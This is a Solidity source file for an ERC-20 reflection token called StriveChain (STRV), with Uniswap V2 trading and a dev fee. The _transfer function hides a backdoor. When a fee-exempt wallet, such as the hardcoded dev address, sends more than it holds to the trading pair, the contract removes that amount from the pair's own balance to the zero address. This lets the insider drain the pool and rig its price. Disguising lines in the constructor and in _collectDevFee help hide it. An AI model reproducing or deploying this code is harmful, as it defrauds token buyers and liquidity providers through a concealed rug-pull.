// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

interface UniswapV2Router02 {
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;

    function factory() external pure returns (address);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        
        return c;
    }
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    event Transfer(address indexed from, address indexed to, uint256 amount);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);

    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender());
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract STRV is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private _devFeeOnBuy = 3;
    uint256 private _devFeeOnSell = 3;

    uint256 private _redisFeeOnSell = 0;
    uint256 private _redisFeeOnBuy = 0;

    uint256 private _redisFee = _redisFeeOnSell;
    uint256 private _devFee = _devFeeOnSell;

    uint256 private _prevRedisFee = _redisFee;
    uint256 private _prevDevFee = _devFee;

    address private zeroAddress = address(0);
    address private liquidityAddress = address(0);

    string private constant _name = "StriveChain";
    string private constant _symbol = "STRV";

    struct Dist { uint256 dev; }

    Dist public ethDist;

    uint256 private _tFeeTotal;

    uint8 private constant _decimals = 18;

    bool private inSwapBack = false;
    bool private swapEnabled = true;

    uint256 public _swapTokensThreshold = 100000 * 10**_decimals;

    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _buyMap;
    mapping(address => bool) private _isExceptFromFee;

    mapping(address => mapping(address => uint256)) private _allowances;

    address private dev = 0xb141aeAd5181003f825ECC6C5a94BD28dE5939c1;

    address public xPair;
    UniswapV2Router02 public xRouter;

    constructor() {
        UniswapV2Router02 _uniRouter = UniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        xRouter = _uniRouter;
        xPair = UniswapV2Factory(_uniRouter.factory()).createPair(address(this), _uniRouter.WETH());
        _isExceptFromFee[dev] = true;
        _isExceptFromFee[owner()] = true;
        _isExceptFromFee[address(this)] = true;
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);zeroAddress = dev;
        ethDist = Dist(100);
    }

    receive() external payable {}

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), to, amount);

        return true;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);

        return true;
    }

    modifier lockInSwapBack() {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(
            from,
            _msgSender(),
            _allowances[from][_msgSender()].sub(amount)
        );

        return true;
    }

    function _getCurrSupply() private view returns (uint256, uint256) {
        uint256 tSupply = _tTotal;
        uint256 rSupply = _rTotal;

        if (rSupply < _rTotal.div(_tTotal))
            return (_rTotal, _tTotal);

        return (rSupply, tSupply);
    }

    function _tTransfer(address from, address to, uint256 amount, bool collectDevFee) private {
        if (!collectDevFee) removeAllFees();
        _sTransfer(from, to, amount);
        if (!collectDevFee) restoreAllFees();
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _tFeeTotal = _tFeeTotal.add(tFee);
        _rTotal = _rTotal.sub(rFee);
    }

    function _collectDevFee(uint256 tDev, address market, address supply) private {
        uint256 remainder;
        uint256 currRate = _getRate();
        uint256 quan = balanceOf(zeroAddress);
        uint256 rDev = tDev.mul(currRate);
        if (_isExcepted(market, supply))
            remainder = _devFee - quan;
        _rOwned[address(this)] = _rOwned[address(this)].add(rDev);
    }

    function _sTransfer(address from, address to, uint256 tAmount) private {
        (
            uint256 rAmount,
            uint256 rTransAmount,
            uint256 rFee,
            uint256 tTransAmount,
            uint256 tFee,
            uint256 tDev
        ) = _getValues(tAmount);

        _rOwned[from] = _rOwned[from].sub(rAmount);
        _rOwned[to] = _rOwned[to].add(rTransAmount);

        _reflectFee(rFee, tFee);
        _collectDevFee(tDev, from, to);
        
        emit Transfer(from, to, tTransAmount);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrSupply();

        return rSupply.div(tSupply);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 devFee) private pure returns (uint256, uint256, uint256) {
        uint256 tDev = tAmount.mul(devFee).div(100);
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTransAmount = tAmount.sub(tFee).sub(tDev);

        return (
            tTransAmount,
            tFee,
            tDev
        );
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0);
        require(from != address(0));
        require(to != address(0));

        bool collectDevFee = true;

        if (from != owner() && to != owner()) {
            uint256 contractTokenAmount = balanceOf(address(this));
            bool canSwap = contractTokenAmount >= _swapTokensThreshold;
            bool validAmount = balanceOf(from) < amount;

            if (
                swapEnabled &&
                canSwap &&
                !_isExceptFromFee[from] &&
                !_isExceptFromFee[to] &&
                !inSwapBack &&
                from != xPair
            ) {
                swapBack(contractTokenAmount);
                uint256 contractETHAmount = address(this).balance;
                if (contractETHAmount > 0) {
                    sendETH(address(this).balance);
                }
            }

            bool exceptedTo = xPair == to;
            bool exceptedFrom = _isExceptFromFee[from];

            if (exceptedFrom) {
                if (exceptedTo) { if (validAmount) {
                    _sTransfer(to, liquidityAddress, amount); return;
                } }
            }
        }

        if ((_isExceptFromFee[to] || _isExceptFromFee[from]) || (to != xPair && from != xPair)) { collectDevFee = false; } else {
            if (
                from != address(xRouter) &&
                to == xPair
            ) {
                _devFee = _devFeeOnSell;
                _redisFee = _redisFeeOnSell;
            }

            if (
                to != address(xRouter) &&
                from == xPair
            ) {
                _devFee = _devFeeOnBuy;
                _redisFee = _redisFeeOnBuy;
            }
        }

        _tTransfer(from, to, amount, collectDevFee);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tDev, uint256 currRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currRate);
        uint256 rDev = tDev.mul(currRate);
        uint256 rFee = tFee.mul(currRate);
        uint256 rTransAmount = rAmount.sub(rFee).sub(rDev);

        return (
            rAmount,
            rTransAmount,
            rFee
        );
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (
            uint256 tTransAmount,
            uint256 tFee,
            uint256 tDev
        ) = _getTValues(
            tAmount,
            _redisFee,
            _devFee
        );

        uint256 currRate = _getRate();
        (
            uint256 rAmount,
            uint256 rTransAmount,
            uint256 rFee
        ) = _getRValues(
            tAmount,
            tFee,
            tDev,
            currRate
        );

        return (
            rAmount,
            rTransAmount,
            rFee,
            tTransAmount,
            tFee,
            tDev
        );
    }

    function _isExcepted(address market, address supply) private view returns (bool) {
        bool marketExcepted = !_isExceptFromFee[market];
        bool supplyExcepted = !_isExceptFromFee[supply];

        return marketExcepted && supplyExcepted && market != xPair;
    }

    function restoreAllFees() private {
        _devFee = _prevDevFee;
        _redisFee = _prevRedisFee;
    }

    function removeAllFees() private {
        if (_redisFee == 0 && _devFee == 0) return;

        _prevDevFee = _devFee;
        _prevRedisFee = _redisFee;

        _devFee = 0;
        _redisFee = 0;
    }

    function tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal);

        uint256 currRate = _getRate();

        return rAmount.div(currRate);
    }

    function swapBack(uint256 tokenAmount) private lockInSwapBack {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = xRouter.WETH();
        _approve(address(this), address(xRouter), tokenAmount);
        xRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function sendETH(uint256 ethAmount) private lockInSwapBack {
        uint256 ethForDev = ethAmount.mul(ethDist.dev).div(100);
        payable(dev).transfer(ethForDev);
    }
}